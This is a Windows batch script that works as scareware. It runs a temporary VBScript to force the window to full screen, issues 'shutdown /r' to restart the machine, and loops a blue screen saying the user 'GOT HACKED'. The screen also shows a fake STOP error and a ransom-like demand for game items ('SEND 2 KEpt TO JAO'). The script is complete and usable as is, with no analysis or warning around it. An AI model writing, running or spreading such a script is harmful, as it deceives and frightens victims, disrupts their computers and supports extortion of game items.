@ECHO OFF

:VBSDynamicBuild
SET TempVBSFile=%temp%\~tmpSendKeysTemp.vbs
IF EXIST "%TempVBSFile%" DEL /F /Q "%TempVBSFile%"
ECHO Set WshShell = WScript.CreateObject("WScript.Shell") >>"%TempVBSFile%"
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"
ECHO WshShell.SendKeys "{F11}"                            >>"%TempVBSFile%
ECHO Wscript.Sleep 900                                    >>"%TempVBSFile%"

CSCRIPT //nologo "%TempVBSFile%"

:a
cls
shutdown /r
color 17








echo          YOU GOT HACKED BY NOT AGAIN DONT YA?

echo          NOOB

echo.

echo          YOU HAVE GOT A DUPED RAINBOW TITANIC NOT.

echo.

echo          FAILED TO LOAD

echo.

echo          THIS IS YOUR FIRST TIME

echo          SEND 2 KEpt TO JAO

echo          YOU GOT HACKED BY NOT

echo. 

echo          EZ.EZ.EZ.EZ.EZ.EZ

echo          KAI.KAI.KAI.KAI

echo.
 
echo          YOU CANT OPEN YOUR COMPUTER

echo          TO RESTART PRESS 001011110

echo          TO 00000000011 10011101110 กด 001011110

echo.

echo          11001100001110001010100011100111110000111000

echo.
echo          *** STOP: 0x00000050 (0xFD3094C2,0x00000001,0xFBFE7617,0x00000000)echo.echo.echo *** SPCMDCON.SYS - Address FBFE7617 base at FBFE5000, DateStamp 3d6dd67c
pause >nul
goto :a